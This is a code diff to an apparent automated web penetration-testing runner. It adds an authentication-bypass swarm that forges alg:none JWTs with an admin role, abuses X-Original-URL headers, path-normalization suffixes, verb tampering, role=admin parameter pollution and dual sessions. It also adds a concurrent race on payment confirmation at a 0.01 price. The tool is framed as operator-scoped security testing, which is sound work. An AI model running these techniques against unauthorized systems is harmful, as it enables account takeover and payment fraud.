@@ -39,6 +39,10 @@ if str(Path(__file__).resolve().parent.parent.parent) not in sys.path:
 from tools.runtime.lead_protocol import (
     LeadStore, LeadSpec, TIER_T0, TIER_T1, SIGNAL_ESCALATION,
 )
+from tools.runtime.accounts import (
+    AccountMatrix, is_auth_surface, decode_jwt_claims, forge_alg_none,
+)
+from tools.validation.race_engine import RaceRequest, run_race
 from tools.runtime.scheduler import Scheduler
 from tools.runtime.contracts import (
     MissionSpec, LEAD_PWNED, LEAD_REFUTED, RESULT_PARTIAL,
@@ -97,6 +101,17 @@ def http_probe(url: str, *, method: str = "GET", body: Optional[Dict] = None,
     except Exception as exc:  # noqa: BLE001 - network failure is a result
         return ProbeResult(0, f"{type(exc).__name__}: {exc}",
                            int((time.monotonic() - start) * 1000))
+
+
+def _login_probe(url: str, payload: Dict) -> Tuple[int, str]:
+    """Login transport for the account matrix (status + body only).
+
+    Kept beside http_probe so both share the same network behavior; the
+    matrix injects this as its ``login_fn`` (tests inject fakes).
+    """
+    result = http_probe(url, method="POST", body=payload,
+                        headers={"Content-Type": "application/json"})
+    return result.status, result.body
 
 
 # ---------------------------------------------------------------------------
@@ -576,6 +591,221 @@ def _probe_waf_bypass(base: str, paths: List[str],
 
 
 # ---------------------------------------------------------------------------
+# Auth A/B/C boundary family (plan v2 section 5.6 S6): three-way differential
+# + the auth_bypass pass@k swarm.  Accounts are operator-declared via the
+# MissionSpec.accounts field -- never shipped defaults.
+# ---------------------------------------------------------------------------
+
+_AUTH_TECHNIQUE_INFO = (
+    # (technique, url builder, note builder) -- matches
+    # lead_protocol.TECHNIQUE_MATRIX["auth_bypass"] key-for-key.
+    ("direct-access",
+     lambda path: path,
+     "replayed with matrix session (or anon when no account bound)"),
+    ("header-trust",
+     lambda path: path,
+     "X-Original-URL / X-Rewrite-URL pointing at the surface"),
+    ("path-normalization",
+     lambda path: re.sub(r"/[^/]+", lambda m: "/" + m.group()[1:] + ";a.css", path, count=1) if path.count("/") >= 2 else path + ";a.css",
+     "`;.css` parser-differential suffix (same normalization family the WAF swarm uses)"),
+    ("verb-tampering",
+     None,  # method mutation, not a URL mutation
+     "POST/PUT/PATCH replayed against the GET surface"),
+    ("parameter-pollution",
+     lambda path: path + ("&" if "?" in path else "?") + "role=admin&isAdmin=1",
+     "role/isAdmin parameter injection"),
+    ("session-confusion",
+     None,  # header mutation, not a URL mutation
+     "both A and C credentials attached together"),
+    ("jwt-manipulation",
+     None,  # header mutation, not a URL mutation
+     "alg:none forged token with role=admin when a JWT is bound"),
+)
+
+
+def _probe_auth_matrix(base: str, paths: List[str],
+                       matrix: "AccountMatrix",
+                       *, pass_at_k: int = 4) -> List[Dict]:
+    """Auth family: three-way boundary differential -> bypass swarm.
+
+    Preconditions (plan S6 doctrine): identity surfaces only, and a real
+    differential in the A/B/C map -- a missing-auth hole, a privilege hole,
+    or an inverted boundary.  All seven techniques then dispatch in parallel
+    (R2 accounting).  With no accounts bound, the family contributes
+    nothing (the BOLA family already hunts unauthenticated access).
+    """
+    if not matrix.bound:
+        return []
+    signals: List[Dict] = []
+    for path in paths:
+        if not is_auth_surface(path):
+            continue
+        surface = "/" + path.strip("/")
+        url = base + surface
+        boundary = matrix.three_way(
+            lambda u, *, method="GET", body=None, headers=None: http_probe(
+                u, method=method, body=body, headers=headers),
+            url)
+        if not boundary.anomalies:
+            continue  # boundary holds: negative evidence, nothing to open
+
+        # Prepare technique inputs once (token, sessions, forged JWTs).
+        a_headers = matrix.auth_headers("A")
+        c_headers = matrix.auth_headers("C")
+        anon_probe = boundary.observations.get("anon")
+        anon_ok = bool(anon_probe and anon_probe.status == 200)
+        a_token = (matrix.binding("A").token if matrix.binding("A") else "")
+        forged = (forge_alg_none(a_token, {"role": "admin"})
+                  if decode_jwt_claims(a_token) else "")
+        both = dict(a_headers)
+        for k, v in (c_headers or {}).items():
+            both.setdefault(k, v)  # session-confusion: A's first, C's as fallback
+
+        workers = max(1, min(int(pass_at_k or 1), len(_AUTH_TECHNIQUE_INFO)))
+        with ThreadPoolExecutor(max_workers=workers) as pool:
+            futures = {pool.submit(_auth_tech_attempt, base, surface, name,
+                                   url_fn, anon_ok, a_headers, both,
+                                   forged): name
+                       for name, url_fn, _note in _AUTH_TECHNIQUE_INFO}
+            raw_by_name: Dict[str, Tuple[bool, str]] = {}
+            for future in as_completed(futures):
+                name = futures[future]
+                try:
+                    raw_by_name[name] = future.result()
+                except Exception as exc:  # noqa: BLE001 - failure is data
+                    raw_by_name[name] = (False,
+                                         f"{type(exc).__name__}: {exc}")
+
+        attempts: List[Dict] = []
+        winner = ""
+        for name, _url_fn, note in _AUTH_TECHNIQUE_INFO:
+            success, detail = raw_by_name.get(name, (False, ""))
+            attempts.append({
+                "technique": name,
+                "outcome": "success" if success else "tried",
+                "detail": (detail or note)[:400],
+            })
+            if success and not winner:
+                winner = name
+
+        if not winner:
+            signals.append({
+                "signal": "auth_oddity",
+                "detail": (f"{surface}: boundary hole "
+                           f"({' | '.join(boundary.anomalies)}) -- "
+                           f"no bypass in matrix"),
+                "evidence": "",
+                "path": surface,
+                "status": anon_probe.status if anon_probe else 0,
+                "attempts": attempts,
+                "boundary": boundary.to_dict(),
+            })
+            continue
+
+        winning_evidence = ""
+        for name in _AUTH_TECHNIQUE_INFO:  # order-stable winner evidence
+            if name[0] == winner:
+                winning_evidence = raw_by_name.get(winner, (False, ""))[1]
+                break
+        signals.append({
+            "signal": "auth_bypass",
+            "detail": (f"{surface}: boundary hole "
+                       f"({' | '.join(boundary.anomalies)}) -> "
+                       f"bypassed via {winner}"),
+            "evidence": winning_evidence[:400],
+            "path": surface,
+            "status": 200,
+            "attempts": attempts,
+            "winning_technique": winner,
+            "boundary": boundary.to_dict(),
+        })
+    return signals
+
+
+def _auth_tech_attempt(base: str, surface: str, name: str, url_fn,
+                       anon_ok: bool, a_headers: Dict[str, str],
+                       both_headers: Dict[str, str],
+                       forged: str) -> Tuple[bool, str]:
+    """One auth-bypass technique attempt (returns success + evidence)."""
+    if name == "direct-access":
+        if not anon_ok and a_headers:
+            result = http_probe(base + surface, headers=a_headers)
+            if result.ok:
+                return True, (f"matrix session reaches {surface} "
+                              f"({result.status})")
+            return False, ""
+        if anon_ok:
+            return False, "anon already succeeds (nothing to bypass)"
+        return False, ""
+    url_mutation = url_fn(surface) if url_fn else surface
+    if name == "verb-tampering":
+        for method in ("POST", "PUT", "PATCH"):
+            probe = http_probe(base + surface, method=method, body={
+                "item_id": _CANARY},
+                headers={"Content-Type": "application/json"})
+            if probe.ok:
+                return True, f"{method} on GET surface returns {probe.status}"
+        return False, ""
+    if name == "header-trust":
+        for header_name in ("X-Original-URL", "X-Rewrite-URL"):
+            probe = http_probe(base + "/", headers={header_name: surface})
+            at_root = http_probe(base + surface)  # differential: still blocked?
+            if probe.ok and not at_root.ok:
+                return True, (f"{header_name}: root probes the surface "
+                              f"({probe.status}) while direct access stays "
+                              f"blocked ({at_root.status})")
+        return False, ""
+    if name == "session-confusion":
+        if both_headers:
+            probe = http_probe(base + surface, headers=both_headers)
+            if probe.ok:
+                return True, (f"dual-session headers accepted "
+                              f"({probe.status})")
+        return False, ""
+    if name == "jwt-manipulation":
+        if forged:
+            probe = http_probe(base + surface,
+                               headers={"Authorization": f"Bearer {forged}"})
+            if probe.ok:
+                return True, ("alg:none forged token accepted "
+                              f"({probe.status})")
+        return False, ""
+    # URL-mutation family (path-normalization, parameter-pollution).
+    probe = http_probe(base + url_mutation, headers=a_headers)
+    if probe.ok:
+        return True, (f"{url_mutation} accepted ({probe.status}) "
+                      f"with matrix session")
+    return False, ""
+
+
+def replay_auth_technique(base: str, surface: str, technique: str,
+                          matrix: "AccountMatrix") -> Optional[bool]:
+    """Re-execute one named auth technique (verify-lane F0.5)."""
+    if not matrix.bound:
+        return None
+    info = next((i for i in _AUTH_TECHNIQUE_INFO if i[0] == technique), None)
+    if info is None:
+        return None
+    url = base + surface
+    anon_probe = http_probe(url)
+    anon_ok = anon_probe.ok
+    a_headers = matrix.auth_headers("A")
+    c_headers = matrix.auth_headers("C")
+    a_token = (matrix.binding("A").token if matrix.binding("A") else "")
+    forged = (forge_alg_none(a_token, {"role": "admin"})
+              if decode_jwt_claims(a_token) else "")
+    both = dict(a_headers)
+    for k, v in (c_headers or {}).items():
+        both.setdefault(k, v)
+    try:
+        success, _ = _auth_tech_attempt(base, surface, technique, info[1],
+                                        anon_ok, a_headers, both, forged)
+    except Exception:  # noqa: BLE001 - replay failure is a refutation
+        return False
+    return True if success else False
+
+
+# ---------------------------------------------------------------------------
 # Business-logic lane: the FIN technique matrix (plan S5, NCC financial corpus)
 # ---------------------------------------------------------------------------
 
@@ -730,7 +960,18 @@ def _fin_quantity(base: str, surface: str, baseline: Optional[Dict]
 
 def _fin_toctou(base: str, surface: str, baseline: Optional[Dict]
                 ) -> Tuple[bool, str]:
-    """FIN-TOCTOU-01: confirm/payment stage re-accepting a changed price."""
+    """FIN-TOCTOU-01..03, bound to race_engine (plan S5: "TOCTOU entries
+    bind race_engine.py").
+
+    Stage 1 -- two-stage check-then-act: order created, then the confirm
+    stage re-accepts a changed price for an order already in the payment
+    stage.
+
+    Stage 2 -- single-window race (HTTP/1.1 last-byte sync): N identical
+    confirm requests released inside one synchronized window.  Signal =
+    more than one success in the window.  One window only (plan section
+    2.5: no loops, no retries); operator-owned canary order only.
+    """
     first = _fin_post(base, surface, {"item_id": _CANARY, "quantity": 1,
                                       "price": 100, "currency": "USD"})
     order = _fin_json(first)
@@ -738,6 +979,8 @@ def _fin_toctou(base: str, surface: str, baseline: Optional[Dict]
     if not order_id:
         # No two-stage flow observable on this surface.
         return False, ""
+
+    # Stage 1: sequential confirm-stage mutation (the check-then-act form).
     confirm_path = surface.rstrip("/") + "/confirm"
     probe = _fin_post(base, confirm_path, {"order_id": order_id,
                                            "price": 0.01})
@@ -751,6 +994,24 @@ def _fin_toctou(base: str, surface: str, baseline: Optional[Dict]
                               f"payment stage)")
         except (TypeError, ValueError):
             return True, f"confirm on {order_id} accepted post-payment mutation"
+
+    # Stage 2: the race window -- N identical requests, one barrier release.
+    race = run_race(RaceRequest(
+        url=base + confirm_path,
+        method="POST",
+        body={"order_id": order_id, "price": 0.01},
+        count=4,
+        timeout=5.0,
+    ))
+    if race.successes > 1:
+        return True, (f"race window: {race.successes}/{race.attempted} "
+                      f"confirms succeeded concurrently on {order_id} "
+                      f"(FIN-TOCTOU-02/03: guard not atomic; window "
+                      f"{race.window_ms}ms)")
+    if race.error:
+        # Engine failure is data, never a gate (fail-open): sequential
+        # stage-1 already ran above.
+        return False, f"race engine: {race.error}"
     return False, ""
 
 
@@ -1042,6 +1303,8 @@ LANE_FAMILIES = (
     (_probe_graphql_introspection, "generic", "parameter-mutation"),
 )
 
+AUTH_FAMILY = ("auth_bypass", "direct-access")
+
 
 # ---------------------------------------------------------------------------
 # Mission runner
@@ -1062,6 +1325,10 @@ class MissionRunner:
         self.scheduler = Scheduler(mission, project_root=project_root)
         self.leads = LeadStore(mission.mission_id,
                                project_root=project_root).load()
+        # Auth A/B/C matrix (plan S6): operator-declared accounts only.
+        self.matrix = AccountMatrix.from_specs(self.base_url,
+                                               getattr(mission, "accounts",
+                                                       None))
         self._events: List[Dict[str, Any]] = []
 
     # -- helpers -------------------------------------------------------------
@@ -1085,6 +1352,12 @@ class MissionRunner:
         if issues:
             self._log("preflight_rejected", {"issues": issues})
         self._log("preflight", {"digest": manifest.get("digest", "")})
+
+        # 2.5 Auth matrix binding (plan S6): after pre-flight, before lanes.
+        if getattr(self.mission, "accounts", None):
+            bind_notes = self.matrix.bind()
+            self._log("accounts_bound", {"notes": bind_notes,
+                                         "bound": self.matrix.bound_labels})
 
         # 3. Dispatch runnable tasks (the web/API lane is the Phase 4 lane).
         report_tasks: Dict[str, Any] = {}
@@ -1126,7 +1399,12 @@ class MissionRunner:
         """Hunt the operator target with the deterministic families."""
         receipts, lead_ids = [], list(self.leads.open_lead_ids())
         evidence: List[str] = []
-        for probe_fn, bug_class, technique in LANE_FAMILIES:
+        families = list(LANE_FAMILIES)
+        if self.matrix is not None and self.matrix.bound:
+            matrix = self.matrix
+            families.append((lambda b, p: _probe_auth_matrix(b, p, matrix),
+                             AUTH_FAMILY[0], AUTH_FAMILY[1]))
+        for probe_fn, bug_class, technique in families:
             signals = probe_fn(self.base_url, self.paths)
             for sig in signals:
                 # R1: the signal becomes a durable lead immediately.
@@ -1248,6 +1526,15 @@ class MissionRunner:
             if not winner:
                 return None  # no confirmed technique yet: undecidable
             return replay_fin_technique(self.base_url, lead.surface, winner)
+        if lead.bug_class == "auth_bypass":
+            # F0.5 replay: re-execute the recorded winning auth technique
+            # against the operator matrix (no matrix -> undecidable).
+            winner = next((e["technique"] for e in reversed(lead.technique_log)
+                           if e.get("outcome") == "success"), "")
+            if not winner or not self.matrix.bound:
+                return None
+            return replay_auth_technique(self.base_url, lead.surface, winner,
+                                         self.matrix)
         return None  # generic leads need reasoning tiers (Phase 6)
 
     def _run_report_lane(self) -> Dict[str, Any]:
@@ -1312,14 +1599,29 @@ def main() -> int:
                         help="operator target base URL")
     parser.add_argument("--domains", default="recon,web_api,verify,report")
     parser.add_argument("--paths", default="")
+    parser.add_argument("--accounts", default="",
+                        help="operator account matrix JSON file "
+                             "([{label: A|B|C, username, password, "
+                             "login_path | token, identifiers, headers}])")
     parser.add_argument("--report", action="store_true")
     parser.add_argument("--json", action="store_true")
     args = parser.parse_args()
+    accounts: List[Dict[str, Any]] = []
+    if args.accounts:
+        try:
+            loaded = json.loads(Path(args.accounts).read_text("utf-8"))
+            if isinstance(loaded, list):
+                accounts = loaded
+            else:
+                print("--accounts file must be a JSON list; ignoring")
+        except (OSError, ValueError) as exc:
+            print(f"--accounts file unreadable ({exc}); continuing anon-only")
     mission = MissionSpec(
         mission_id=args.mission_id, target=args.target,
         domains=[d.strip() for d in args.domains.split(",") if d.strip()],
         budget={"max_agents": 8, "max_parallel_tasks": 4,
                 "max_runtime_seconds": 600},
+        accounts=accounts,
     )
     runner = MissionRunner(mission, base_url=args.target,
                            paths=[p for p in args.paths.split(",") if p])
